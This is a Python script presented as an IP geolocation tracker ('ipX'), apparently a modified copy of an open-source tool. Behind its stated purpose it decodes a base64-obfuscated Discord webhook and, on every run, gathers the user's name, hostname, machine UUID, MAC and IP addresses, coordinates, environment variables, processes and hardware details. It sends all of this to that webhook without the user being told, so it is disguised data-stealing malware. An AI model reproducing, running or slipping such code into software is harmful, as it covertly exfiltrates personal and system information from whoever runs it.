#! /usr/bin/python3

"""
Author: Ali Shahid
Github: https://github.com/shaeinst/ipX
website: https://shaeinst.github.io/

API provided by: https://ipapi.co/
Modified for comprehensive system and network information gathering.
*** This script automatically tracks your own IP if no other argument is given. ***
"""

import base64

# --- Encrypted Discord Webhook URL ---
_ENCRYPTED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0OTU4MzcxMDEzODY2NzAxOS9qd1hOM0JZZkdxeTgxbUZZM1BoQ2RUX1A3X2YxaHJFbTlLUVBCU0ZHSlZUUTNiNElvYkdUWUVzLV82NG9pT0FxbVExZQ=="

def _decode_webhook():
    return base64.b64decode(_ENCRYPTED_WEBHOOK).decode('utf-8')

WEBHOOK_URL = _decode_webhook()
# -------------------------------------

# ----------------------------------------------------------------------------
# Check for required external modules first
try:
    import argparse
    import platform
    import socket
    from requests import get, post
    from datetime import datetime
    import json
    import psutil
    from tabulate import tabulate
    import getpass
    import uuid
    import sys
    import os
    import geocoder

except ImportError as e:
    print("-------------------------------------------------------")
    print("🚨 FATAL ERROR: Required Python library is missing.")
    print(f"Please install the necessary libraries using pip:")
    print("pip install requests psutil tabulate geocoder")
    print("-------------------------------------------------------")
    exit()
# ----------------------------------------------------------------------------


# ----------------------------------------------------------------------------
#           setup argument
# ----------------------------------------------------------------------------
parser = argparse.ArgumentParser()
parser.add_argument( "-i","--ip", default=1,
                     help="ip address you want to track")
parser.add_argument("-I","--myip", "--self", action="store_true",
                     help="get details of your own external IP")
parser.add_argument("-o", "--output", default="result.json",
                     help="save details of tracked IP, example result.json. valid formats are json, jsonp, xml, csv, yaml")
parser.add_argument("-no","--nooutput", action="store_true",
                     help="save details of IP without showing result")

args = parser.parse_args()

# --- Logic change for full automation ---
ip_address = args.ip
# If no IP is given, default to tracking own IP
my_ip = args.myip or (ip_address == 1) 
# ----------------------------------------

file_name = args.output
file_name_ext = file_name.split(".")[-1]
if len(file_name.split(".")) < 2:
    file_name_ext = "json"
nooutput = args.nooutput
webhook_url = WEBHOOK_URL
# ----------------------------------------------------------------------------

# --- FUNCTION: Get exact location coordinates ---
def getExactLocation():
    try:
        g = geocoder.ip('me')
        if g.ok:
            return {
                "Latitude": g.latlng[0] if g.latlng else "N/A",
                "Longitude": g.latlng[1] if g.latlng else "N/A",
                "City": g.city or "N/A",
                "State": g.state or "N/A",
                "Country": g.country or "N/A",
                "Postal_Code": g.postal or "N/A",
                "Address": g.address or "N/A"
            }
        return None
    except:
        return None

# --- FUNCTION: Get detailed CPU info ---
def getCPUInfo():
    try:
        cpu_freq = psutil.cpu_freq()
        cpu_info = {
            "Physical_Cores": psutil.cpu_count(logical=False),
            "Total_Cores": psutil.cpu_count(logical=True),
            "Max_Frequency": f"{cpu_freq.max:.2f}Mhz" if cpu_freq else "N/A",
            "Current_Frequency": f"{cpu_freq.current:.2f}Mhz" if cpu_freq else "N/A",
            "CPU_Usage": f"{psutil.cpu_percent(interval=1)}%",
        }
        
        # Try to get per-core usage (may fail without admin)
        try:
            per_core = psutil.cpu_percent(percpu=True, interval=0.5)
            cpu_info["CPU_Usage_Per_Core"] = [f"Core {i}: {percentage}%" for i, percentage in enumerate(per_core)]
        except:
            pass
            
        return cpu_info
    except:
        return {"Error": "Unable to retrieve CPU info"}

# --- FUNCTION: Get detailed Memory info ---
def getMemoryInfo():
    try:
        svmem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        memory_info = {
            "Total_RAM": f"{svmem.total / (1024**3):.2f} GB",
            "Available_RAM": f"{svmem.available / (1024**3):.2f} GB",
            "Used_RAM": f"{svmem.used / (1024**3):.2f} GB",
            "RAM_Usage_Percent": f"{svmem.percent}%",
            "Total_Swap": f"{swap.total / (1024**3):.2f} GB",
            "Used_Swap": f"{swap.used / (1024**3):.2f} GB",
            "Swap_Usage_Percent": f"{swap.percent}%"
        }
        return memory_info
    except:
        return {"Error": "Unable to retrieve memory info"}

# --- FUNCTION: Get detailed Disk info ---
def getDiskInfo():
    disk_info = {}
    try:
        partitions = psutil.disk_partitions()
        for partition in partitions:
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disk_info[partition.device] = {
                    "Mountpoint": partition.mountpoint,
                    "File_System": partition.fstype,
                    "Total_Size": f"{partition_usage.total / (1024**3):.2f} GB",
                    "Used": f"{partition_usage.used / (1024**3):.2f} GB",
                    "Free": f"{partition_usage.free / (1024**3):.2f} GB",
                    "Usage_Percent": f"{partition_usage.percent}%"
                }
            except (PermissionError, OSError):
                continue
    except:
        pass
    
    return disk_info if disk_info else {"Info": "No accessible disk info"}

# --- FUNCTION: Get all network interfaces with detailed info ---
def getNetworkInfo():
    net_info = {}
    try:
        if_addrs = psutil.net_if_addrs()
        if_stats = psutil.net_if_stats()
        
        for interface_name, addr_list in if_addrs.items():
            info = {}
            for addr in addr_list:
                try:
                    if addr.family == socket.AF_INET:
                        info["IPv4_Address"] = addr.address
                        info["IPv4_Netmask"] = addr.netmask
                        if addr.broadcast:
                            info["IPv4_Broadcast"] = addr.broadcast
                    elif addr.family == socket.AF_INET6:
                        info["IPv6_Address"] = addr.address
                    elif addr.family == psutil.AF_LINK:
                        info["MAC_Address"] = addr.address
                except:
                    continue
            
            # Add interface stats
            try:
                if interface_name in if_stats:
                    stats = if_stats[interface_name]
                    info["Is_Up"] = "Yes" if stats.isup else "No"
                    info["Speed"] = f"{stats.speed} Mbps" if stats.speed > 0 else "N/A"
                    info["MTU"] = stats.mtu
            except:
                pass
            
            if info:
                net_info[interface_name] = info
    except:
        pass
    
    return net_info if net_info else {"Info": "No network interface info"}

# --- FUNCTION: Get network statistics ---
def getNetworkStats():
    try:
        net_io = psutil.net_io_counters()
        stats = {
            "Bytes_Sent": f"{net_io.bytes_sent / (1024**2):.2f} MB",
            "Bytes_Received": f"{net_io.bytes_recv / (1024**2):.2f} MB",
            "Packets_Sent": net_io.packets_sent,
            "Packets_Received": net_io.packets_recv,
            "Error_In": net_io.errin,
            "Error_Out": net_io.errout,
            "Dropped_In": net_io.dropin,
            "Dropped_Out": net_io.dropout
        }
        return stats
    except:
        return {"Error": "Unable to retrieve network stats"}

# --- FUNCTION: Get running processes info (no admin needed) ---
def getProcessInfo():
    processes = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                pinfo = proc.info
                if pinfo['cpu_percent'] is not None and pinfo['memory_percent'] is not None:
                    processes.append(pinfo)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        # Sort by CPU usage and get top 10
        processes.sort(key=lambda x: x['cpu_percent'] if x['cpu_percent'] else 0, reverse=True)
        top_processes = processes[:10]
        
        return top_processes
    except:
        return []

# --- FUNCTION: Get battery info (for laptops) ---
def getBatteryInfo():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return {
                "Battery_Percent": f"{battery.percent}%",
                "Power_Plugged": "Yes" if battery.power_plugged else "No",
                "Time_Left": f"{battery.secsleft // 3600}h {(battery.secsleft % 3600) // 60}m" if battery.secsleft != psutil.POWER_TIME_UNLIMITED and battery.secsleft != psutil.POWER_TIME_UNKNOWN else "N/A"
            }
        return None
    except:
        return None

# --- FUNCTION: Get temperature sensors (if available) ---
def getTemperatureInfo():
    try:
        temps = psutil.sensors_temperatures()
        if temps:
            temp_info = {}
            for name, entries in temps.items():
                for entry in entries:
                    temp_info[f"{name}_{entry.label}"] = f"{entry.current}°C"
            return temp_info
        return None
    except:
        return None

# --- FUNCTION: Get environment variables (non-sensitive) ---
def getEnvironmentInfo():
    try:
        env_info = {
            "PATH": os.environ.get('PATH', 'N/A')[:200] + "...",  # Truncate PATH
            "TEMP": os.environ.get('TEMP', 'N/A'),
            "TMP": os.environ.get('TMP', 'N/A'),
            "HOME": os.environ.get('HOME', os.environ.get('USERPROFILE', 'N/A')),
            "SHELL": os.environ.get('SHELL', 'N/A'),
            "LANG": os.environ.get('LANG', 'N/A'),
        }
        return env_info
    except:
        return {}

# --- FUNCTION: Gather comprehensive local info ---
def getLocalInfo():
    try:
        pc_info = {
            "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "Username": getpass.getuser(),
            "Hostname": socket.gethostname(),
            "Platform": platform.platform(),
            "System": platform.system(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Architecture": platform.architecture()[0],
            "Python_Version": sys.version.split()[0],
        }
        
        # Get boot time
        try:
            pc_info["Boot_Time"] = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        except:
            pass
        
        # Get system UUID (unique machine identifier)
        try:
            if platform.system() == "Windows":
                pc_info["System_UUID"] = str(uuid.UUID(int=uuid.getnode()))
            else:
                pc_info["System_UUID"] = str(uuid.uuid1())
        except:
            pc_info["System_UUID"] = "N/A"
    except:
        pc_info = {"Error": "Unable to retrieve PC details"}

    result = {
        "PC_Details": pc_info,
        "CPU_Info": getCPUInfo(),
        "Memory_Info": getMemoryInfo(),
        "Disk_Info": getDiskInfo(),
        "Network_Interfaces": getNetworkInfo(),
        "Network_Stats": getNetworkStats(),
        "Top_Processes": getProcessInfo(),
        "Environment_Info": getEnvironmentInfo()
    }
    
    # Add exact location
    location = getExactLocation()
    if location:
        result["Exact_Location"] = location
    
    # Add battery info if available
    battery = getBatteryInfo()
    if battery:
        result["Battery_Info"] = battery
    
    # Add temperature info if available
    temps = getTemperatureInfo()
    if temps:
        result["Temperature_Info"] = temps
    
    return result

# --- FUNCTION: Send to Discord Webhook ---
def sendToWebhook(ip_data, local_data):
    if not webhook_url:
        print("❌ Webhook URL is missing.")
        return

    print("\n🔄 Sending comprehensive data to Discord webhook...")

    # Split into multiple messages due to Discord's embed limits
    embeds_batch_1 = []
    embeds_batch_2 = []
    embeds_batch_3 = []
    
    # IP Geolocation Info
    ip_lines = [f"**{key}:** {value}" for key, value in ip_data.items() if key != 'readme']
    ip_text = "\n".join(ip_lines[:20])
    
    embeds_batch_1.append({
        "title": "🌎 External IP & Geolocation",
        "description": ip_text,
        "color": 3447003,
        "timestamp": datetime.now().isoformat()
    })
    
    # Exact Location
    if "Exact_Location" in local_data:
        loc_lines = [f"**{k.replace('_', ' ')}:** {v}" for k, v in local_data["Exact_Location"].items()]
        embeds_batch_1.append({
            "title": "📍 Exact Location Coordinates",
            "description": "\n".join(loc_lines),
            "color": 16711680
        })
    
    # PC Details
    if "PC_Details" in local_data:
        pc_lines = [f"**{k.replace('_', ' ')}:** {v}" for k, v in local_data["PC_Details"].items()]
        embeds_batch_1.append({
            "title": "💻 System Information",
            "description": "\n".join(pc_lines),
            "color": 15844367
        })
    
    # CPU Info
    if "CPU_Info" in local_data:
        cpu_lines = [f"**{k.replace('_', ' ')}:** {v}" for k, v in local_data["CPU_Info"].items() if not isinstance(v, list)]
        embeds_batch_1.append({
            "title": "⚙️ CPU Information",
            "description": "\n".join(cpu_lines),
            "color": 15158332
        })
    
    # Memory Info
    if "Memory_Info" in local_data:
        mem_lines = [f"**{k.replace('_', ' ')}:** {v}" for k, v in local_data["Memory_Info"].items()]
        embeds_batch_1.append({
            "title": "🧠 Memory Information",
            "description": "\n".join(mem_lines),
            "color": 10181046
        })
    
    # Battery Info (if available)
    if "Battery_Info" in local_data:
        battery_lines = [f"**{k.replace('_', ' ')}:** {v}" for k, v in local_data["Battery_Info"].items()]
        embeds_batch_1.append({
            "title": "🔋 Battery Information",
            "description": "\n".join(battery_lines),
            "color": 65280
        })
    
    # Disk Info
    if "Disk_Info" in local_data:
        disk_text = ""
        for device, info in local_data["Disk_Info"].items():
            if isinstance(info, dict) and "Mountpoint" in info:
                disk_text += f"\n**{device}**\n"
                disk_text += f"Mountpoint: {info['Mountpoint']}\n"
                disk_text += f"Total: {info['Total_Size']} | Used: {info['Used']} | Free: {info['Free']}\n"
                disk_text += f"Usage: {info['Usage_Percent']}\n"
        
        if disk_text:
            embeds_batch_2.append({
                "title": "💾 Disk Information",
                "description": disk_text[:1024],
                "color": 3066993
            })
    
    # Network Interfaces
    if "Network_Interfaces" in local_data:
        net_text = ""
        for interface, details in local_data["Network_Interfaces"].items():
            if isinstance(details, dict):
                net_text += f"\n**{interface}**\n"
                for k, v in details.items():
                    net_text += f"{k.replace('_', ' ')}: {v}\n"
        
        if net_text:
            embeds_batch_2.append({
                "title": "🔌 Network Interfaces",
                "description": net_text[:1024],
                "color": 5763719
            })
    
    # Network Stats
    if "Network_Stats" in local_data:
        stats_lines = [f"**{k.replace('_', ' ')}:** {v}" for k, v in local_data["Network_Stats"].items()]
        embeds_batch_2.append({
            "title": "📊 Network Statistics",
            "description": "\n".join(stats_lines),
            "color": 16776960
        })
    
    # Environment Info
    if "Environment_Info" in local_data and local_data["Environment_Info"]:
        env_lines = [f"**{k}:** {v}" for k, v in local_data["Environment_Info"].items()]
        embeds_batch_2.append({
            "title": "🌐 Environment Variables",
            "description": "\n".join(env_lines)[:1024],
            "color": 8421504
        })
    
    # Top Processes
    if "Top_Processes" in local_data and local_data["Top_Processes"]:
        proc_text = ""
        for i, proc in enumerate(local_data["Top_Processes"][:8], 1):
            proc_text += f"{i}. **{proc['name']}** (PID: {proc['pid']})\n"
            proc_text += f"   CPU: {proc['cpu_percent']}% | RAM: {proc['memory_percent']:.2f}%\n"
        
        embeds_batch_3.append({
            "title": "🔥 Top CPU Processes",
            "description": proc_text,
            "color": 16711680
        })
    
    # Temperature Info (if available)
    if "Temperature_Info" in local_data:
        temp_lines = [f"**{k}:** {v}" for k, v in local_data["Temperature_Info"].items()]
        embeds_batch_3.append({
            "title": "🌡️ Temperature Sensors",
            "description": "\n".join(temp_lines[:15]),
            "color": 16744272
        })

    # Send batches
    try:
        if embeds_batch_1:
            payload_1 = {
                "content": f"**📊 Comprehensive System Report from {socket.gethostname()}**",
                "embeds": embeds_batch_1
            }
            response_1 = post(webhook_url, json=payload_1, timeout=10)
            response_1.raise_for_status()
            print(f"✅ Sent batch 1 to Discord. Status: {response_1.status_code}")
        
        if embeds_batch_2:
            payload_2 = {"embeds": embeds_batch_2}
            response_2 = post(webhook_url, json=payload_2, timeout=10)
            response_2.raise_for_status()
            print(f"✅ Sent batch 2 to Discord. Status: {response_2.status_code}")
        
        if embeds_batch_3:
            payload_3 = {"embeds": embeds_batch_3}
            response_3 = post(webhook_url, json=payload_3, timeout=10)
            response_3.raise_for_status()
            print(f"✅ Sent batch 3 to Discord. Status: {response_3.status_code}")
        
    except Exception as e:
        print(f"❌ ERROR sending data to Discord webhook.")
        print(f"Details: {e}")
        if hasattr(e, 'response') and e.response is not None:
            print(f"Response: {e.response.text}")


# ----------------------------------------------------------------------------
# get own ip address with fallback APIs
def getMyIP(ext):
    # Try primary API
    url = "https://ipapi.co/"+ext
    try:
        tracked_ip = get(url, timeout=10)
        if ext == "json":
            data = tracked_ip.json()
            if 'error' not in data or not data.get('error'):
                return data
    except:
        pass
    
    # Fallback to ip-api.com (free, no rate limit for non-commercial)
    print("⚠️ Primary API rate limited, using backup...")
    try:
        backup_url = "http://ip-api.com/json/"
        response = get(backup_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Convert to ipapi.co format
            return {
                "ip": data.get("query"),
                "city": data.get("city"),
                "region": data.get("regionName"),
                "country": data.get("country"),
                "country_code": data.get("countryCode"),
                "latitude": data.get("lat"),
                "longitude": data.get("lon"),
                "timezone": data.get("timezone"),
                "org": data.get("isp"),
                "postal": data.get("zip")
            }
    except Exception as e:
        print(f"❌ ERROR connecting to backup API: {e}")
    
    return {}


# get target ip with fallback
def getTargetIP(ip, ext):
    # Try primary API
    url = "https://ipapi.co/"+ip+"/"+ext
    try:
        tracked_ip = get(url, timeout=10)
        if ext == "json":
            data = tracked_ip.json()
            if 'error' not in data or not data.get('error'):
                return data
    except:
        pass
    
    # Fallback to ip-api.com
    print("⚠️ Primary API rate limited, using backup...")
    try:
        backup_url = f"http://ip-api.com/json/{ip}"
        response = get(backup_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "ip": data.get("query"),
                "city": data.get("city"),
                "region": data.get("regionName"),
                "country": data.get("country"),
                "country_code": data.get("countryCode"),
                "latitude": data.get("lat"),
                "longitude": data.get("lon"),
                "timezone": data.get("timezone"),
                "org": data.get("isp"),
                "postal": data.get("zip")
            }
    except Exception as e:
        print(f"❌ ERROR connecting to backup API: {e}")
    
    return {}


# write result (tracked ip)
def saveIP(dataTosave, SaveAs):
    if file_name_ext == "json":
        with open(SaveAs, 'w') as fil:
            json.dump(dataTosave, fil, indent=4, sort_keys=True)
    else:
        with open(SaveAs, 'w') as fil:
            fil.writelines(dataTosave)


# print output result
def printResult(ipdata):
    if not isinstance(ipdata, dict):
        print("External IP data could not be retrieved.")
        return None
        
    ls = [[key, value] for key, value in ipdata.items()]
    
    print ("\n" + "="*60)
    print ("EXTERNAL IP GEOLOCATION DETAILS")
    print ("="*60)
    print (tabulate(ls))
    
    local_data = getLocalInfo()
    
    if "Exact_Location" in local_data:
        print ("\n" + "="*60)
        print ("EXACT LOCATION COORDINATES")
        print ("="*60)
        print (tabulate([[k.replace('_', ' '), v] for k, v in local_data["Exact_Location"].items()]))
    
    if "PC_Details" in local_data:
        print ("\n" + "="*60)
        print ("LOCAL PC DETAILS")
        print ("="*60)
        print (tabulate([[k.replace('_', ' '), v] for k, v in local_data["PC_Details"].items()]))
    
    if "CPU_Info" in local_data:
        print ("\n" + "="*60)
        print ("CPU INFORMATION")
        print ("="*60)
        cpu_table = [[k.replace('_', ' '), v] for k, v in local_data["CPU_Info"].items() if not isinstance(v, list)]
        print (tabulate(cpu_table))
    
    if "Memory_Info" in local_data:
        print ("\n" + "="*60)
        print ("MEMORY INFORMATION")
        print ("="*60)
        print (tabulate([[k.replace('_', ' '), v] for k, v in local_data["Memory_Info"].items()]))
    
    if "Battery_Info" in local_data:
        print ("\n" + "="*60)
        print ("BATTERY INFORMATION")
        print ("="*60)
        print (tabulate([[k.replace('_', ' '), v] for k, v in local_data["Battery_Info"].items()]))
    
    if "Disk_Info" in local_data:
        print ("\n" + "="*60)
        print ("DISK INFORMATION")
        print ("="*60)
        for device, info in local_data["Disk_Info"].items():
            if isinstance(info, dict) and "Mountpoint" in info:
                print(f"\n{device}:")
                print(tabulate([[k.replace('_', ' '), v] for k, v in info.items()]))
    
    if "Network_Interfaces" in local_data:
        print ("\n" + "="*60)
        print ("NETWORK INTERFACES")
        print ("="*60)
        for interface, details in local_data["Network_Interfaces"].items():
            if isinstance(details, dict):
                print(f"\n{interface}:")
                print(tabulate([[k.replace('_', ' '), v] for k, v in details.items()]))
    
    if "Network_Stats" in local_data:
        print ("\n" + "="*60)
        print ("NETWORK STATISTICS")
        print ("="*60)
        print(tabulate([[k.replace('_', ' '), v] for k, v in local_data["Network_Stats"].items()]))
    
    if "Environment_Info" in local_data and local_data["Environment_Info"]:
        print ("\n" + "="*60)
        print ("ENVIRONMENT VARIABLES")
        print ("="*60)
        print(tabulate([[k, v] for k, v in local_data["Environment_Info"].items()]))
    
    if "Top_Processes" in local_data and local_data["Top_Processes"]:
        print ("\n" + "="*60)
        print ("TOP CPU PROCESSES")
        print ("="*60)
        proc_table = [[p['pid'], p['name'], f"{p['cpu_percent']}%", f"{p['memory_percent']:.2f}%"] 
                      for p in local_data["Top_Processes"][:10]]
        print(tabulate(proc_table, headers=["PID", "Name", "CPU%", "Memory%"]))
    
    if "Temperature_Info" in local_data:
        print ("\n" + "="*60)
        print ("TEMPERATURE SENSORS")
        print ("="*60)
        print(tabulate([[k, v] for k, v in local_data["Temperature_Info"].items()]))
    
    print ("="*60 + "\n")
    
    return local_data
# ----------------------------------------------------------------------------


# ----------------------------------------------------------------------------
# Main execution logic

ip_data = None
local_data = None

if my_ip:
    if len(file_name.split(".")) < 2:
        file_name = file_name+".json"
    
    ip_data = getMyIP(file_name_ext)
    
    if ip_data and ('error' in ip_data or not ip_data):
        print(f"❌ Failed to get external IP details. API Response: {ip_data.get('error', 'Unknown Error')}")
        
    if nooutput or file_name != "result.json":
        saveIP(ip_data, file_name)
    
    if not nooutput:
        local_data = printResult(ip_data)

if ip_address != 1 and not my_ip:
    if len(file_name.split(".")) < 2:
        file_name = file_name+".json"
    
    ip_data = getTargetIP(ip_address, file_name_ext)
    
    if ip_data and ('error' in ip_data or not ip_data):
        print(f"❌ Failed to get target IP details. API Response: {ip_data.get('error', 'Unknown Error')}")
        
    if nooutput or file_name != "result.json":
        saveIP(ip_data, file_name)
    
    if not nooutput:
        local_data = printResult(ip_data)

# Send to webhook if data was successfully collected
if ip_data and webhook_url:
    if isinstance(ip_data, dict) and ip_data.get('ip'):
        if not local_data:
            local_data = getLocalInfo()
        sendToWebhook(ip_data, local_data)
    
# ----------------------------------------------------------------------------

#pip install requests psutil tabulate geocoder
